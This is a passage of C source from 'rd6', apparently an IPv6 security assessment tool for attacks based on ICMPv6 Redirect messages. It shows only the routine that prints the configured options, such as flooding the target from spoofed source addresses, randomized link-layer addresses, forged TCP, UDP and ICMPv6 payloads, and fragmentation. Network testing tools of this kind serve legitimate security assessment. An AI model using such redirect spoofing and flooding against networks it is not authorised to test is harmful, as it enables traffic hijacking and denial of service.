	puts( "rd6 version 1.1\nAssessment tool for attack vectors based on Redirect messages\n\n");

	if(makeonlink_f)
		puts("Making nodes on-link (setting the RD Target Address to the RD Destination Address)");

	if(floods_f)
		printf("Flooding the target from %u different IPv6 Source Addresses\n", nsources);

	if(floodr_f)
		printf("Flooding the target with %u Redirected Addresses\n", nredirs);

	if(floodt_f)
		printf("Flooding the target with %u Target Addresses\n", ntargets);

	if(!floods_f){
		if(ether_ntop(&idata->hsrcaddr, plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Source Address: %s%s\n", plinkaddr, ((!idata->hsrcaddr_f)?" (randomized)":""));
	}
	else{
		if(idata->hsrcaddr_f){
			if(ether_ntop(&idata->hsrcaddr, plinkaddr, sizeof(plinkaddr)) == 0){
				puts("ether_ntop(): Error converting address");
				exit(EXIT_FAILURE);
			}

			printf("Ethernet Source Address: %s\n", plinkaddr);
		}
		else
			puts("Ethernet Source Address: randomized for each packet");
	}

	/* 
	   Ethernet Destination Address only used if a IPv6 Destination Address or an
	   Ethernet Destination Address were specified.
	 */
	if(idata->dstaddr_f){
		if(ether_ntop(&idata->hdstaddr, plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Destination Address: %s%s\n", plinkaddr, \
					((!idata->hdstaddr_f)?" (all-nodes multicast)":""));
	}


	if(inet_ntop(AF_INET6, &idata->srcaddr, psrcaddr, sizeof(psrcaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(!floods_f){
		printf("IPv6 Source Address: %s%s\n", psrcaddr, ((!idata->srcaddr_f)?" (randomized)":""));
	}
	else{
		printf("IPv6 Source Address: randomized, from the %s/%u prefix%s\n", psrcaddr, idata->srcpreflen, \
    									(!idata->srcprefix_f)?" (default)":"");
	}

	if(idata->dstaddr_f){
		if(inet_ntop(AF_INET6, &(idata->dstaddr), pdstaddr, sizeof(pdstaddr)) == NULL){
			puts("inet_ntop(): Error converting IPv6 Destination Address to presentation format");
			exit(EXIT_FAILURE);
		}

		printf("IPv6 Destination Address: %s%s\n", pdstaddr, ((!idata->dstaddr_f)?" (all-nodes link-local multicast)":""));
	}

	printf("IPv6 Hop Limit: %u%s\n", hoplimit, (hoplimit_f)?"":" (default)");

	for(i=0; i<ndstoptuhdr; i++)
		printf("Destination Options Header (Unfragmentable part): %u bytes\n", dstoptuhdrlen[i]);

	for(i=0; i<nhbhopthdr; i++)
		printf("Hop by Hop Options Header: %u bytes\n", hbhopthdrlen[i]);

	for(i=0; i<ndstopthdr; i++)
		printf("Destination Options Header: %u bytes\n", dstopthdrlen[i]);

	if(fragh_f)
		printf("Sending each packet in fragments of %u bytes (plus the Unfragmentable part)\n", nfrags);

	if(inet_ntop(AF_INET6, &rediraddr, pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting Redirected Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(idata->dstaddr_f){
		if(!floodr_f){
			printf("Redirect Destination Address: %s%s\n", pv6addr, ((!rediraddr_f)?" (randomized)":""));
		}
		else{
			printf("Redirect Destination Address: randomized, from the %s/%u prefix%s\n", pv6addr, redirpreflen, \
    										(!redirprefix_f)?" (default)":"");
		}
	}

	if(inet_ntop(AF_INET6, &targetaddr, pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting Redirect Target Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(idata->dstaddr_f && targetaddr_f){
		if(!floodt_f){
			printf("Redirect Target Address: %s%s\n", pv6addr, ((!targetaddr_f)?" (randomized)":""));
		}
		else{
			printf("Redirect Target Address: randomized, from the %s/%u prefix%s\n", pv6addr, targetpreflen, \
    										(!targetprefix_f)?" (default)":"");
		}
	}

	for(i=0;i<nlinkaddr;i++){
		if(ether_ntop(&linkaddr[i], plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Target Link-layer Address option -> Address: %s\n", \
				    ((floods_f && !tllaopta_f)?"(randomized for each packet)":plinkaddr));
	}

	if((rhtcp_f || rhdefault_f) && idata->dstaddr_f){
		printf("Payload Type: IPv6/TCP%s\n", (rhdefault_f?" (default)":""));
		printf("Source Port: %u%s\tDestination Port: %u%s\n",  peerport, (peerport_f?"":" (randomized)"),\
							redirport, (redirport_f?"":" (randomized)"));

		printf("SEQ Number: %u%s\tACK Number: %u%s\n", tcpseq, (tcpseq_f?"":" (randomized)"), \
								tcpack, (tcpack_f?"":" (randomized)"));

		printf("Flags: %s%s%s%s%s%s%s%s\t", ((tcpflags & TH_FIN)?"F":""), ((tcpflags & TH_SYN)?"S":""), \
					((tcpflags & TH_RST)?"R":""), ((tcpflags & TH_PUSH)?"P":""),\
					((tcpflags & TH_ACK)?"A":""), ((tcpflags & TH_URG)?"U":""),\
					((!tcpflags)?"none":""), ((!tcpflags_f)?" (default)":""));

		printf("Window: %u%s\tURG Pointer: %u%s\n", tcpwin, (tcpwin_f?"":" (randomized)"), \
								tcpurg, (tcpurg_f?"":" (default)"));
	}

	if(rhudp_f && idata->dstaddr_f){
		puts("Payload Type: IPv6/UDP");
		printf("Source Port: %u%s\tDestination Port: %u%s\n", peerport, (peerport_f?"":" (randomized)"),\
							redirport, (redirport_f?"":" (randomized)"));
	}

	if(rhicmp6_f && idata->dstaddr_f){
		puts("Payload Type: IPv6/ICMPv6 Echo Request");
		printf("Identifier: %u%s\tSequence Number: %u%s", icmp6id, (icmp6id_f?"":" (randomized)"), \
								icmp6seq, (icmp6seq_f?"":" (randomized)"));
	}
}

